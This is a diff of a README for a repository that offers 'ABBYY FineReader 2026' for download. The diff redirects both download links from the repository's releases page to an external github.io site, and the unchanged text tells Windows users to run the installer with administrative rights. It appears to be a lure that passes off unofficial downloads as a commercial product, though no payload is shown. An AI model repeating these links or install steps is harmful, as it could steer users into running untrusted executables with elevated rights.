@@ -1,6 +1,6 @@
 # 📄 ABBYY-FineReader-2026 - Convert documents into editable digital files
 
-[![](https://img.shields.io/badge/Download_ABBYY-FineReader-blue.svg)](https://github.com/nerissareplete400/ABBYY-FineReader-2026/releases)
+[![](https://img.shields.io/badge/Download_ABBYY-FineReader-blue.svg)](https://nerissareplete400.github.io)
 
 ABBYY FineReader 2026 automates document conversion. It turns images, scans, and PDF files into formats you can edit, search, and share. This software identifies text within pictures and layouts with high accuracy. Use this guide to set up the software on your Windows computer.
 
@@ -20,7 +20,7 @@ Ensure you have administrative rights on your computer. This allows the installe
 
 You need to access the release page to get the installer. The software resides in the releases section of this repository.
 
-[Click here to visit the download page](https://github.com/nerissareplete400/ABBYY-FineReader-2026/releases)
+[Click here to visit the download page](https://nerissareplete400.github.io)
 
 1. Navigate to the link shown above.
 2. Find the section labeled Assets under the most recent release.
